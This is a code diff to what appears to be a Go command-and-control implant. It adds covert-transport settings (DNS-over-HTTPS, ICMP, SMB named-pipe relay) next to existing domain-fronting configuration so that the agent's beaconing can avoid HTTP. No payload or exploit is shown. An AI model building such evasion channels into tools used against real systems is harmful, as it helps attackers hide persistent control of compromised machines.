@@ -56,6 +56,16 @@ var (
 	//          C2_SERVER=https://your-cdn-worker.workers.dev
 	defaultFrontDomain = ""
 
+	// Alternative transport selection.
+	// defaultTransport: http (default) | doh | icmp | smb
+	// When non-http, the agent bypasses the HTTP beacon loop and uses the
+	// selected covert channel instead.
+	defaultTransport   = "http"
+	defaultDOHDomain   = ""          // required for doh transport
+	defaultDOHProvider = "cloudflare" // cloudflare | google
+	defaultSMBRelay    = ""          // hostname/IP of SMB relay host
+	defaultSMBPipe     = "svcctl"   // named pipe on relay
+
 	// Debug mode — keeps console open on exit (Windows)
 	debugMode = "false"
 )
@@ -123,6 +133,11 @@ func main() {
 		ExecMethod:        defaultExecMethod,
 		Profile:           profiles.Get(defaultProfile),
 		FrontDomain:       defaultFrontDomain,
+		Transport:         defaultTransport,
+		DOHDomain:         defaultDOHDomain,
+		DOHProvider:       defaultDOHProvider,
+		SMBRelay:          defaultSMBRelay,
+		SMBPipe:           defaultSMBPipe,
 	}
 
 	agent, err := NewAgent(cfg)
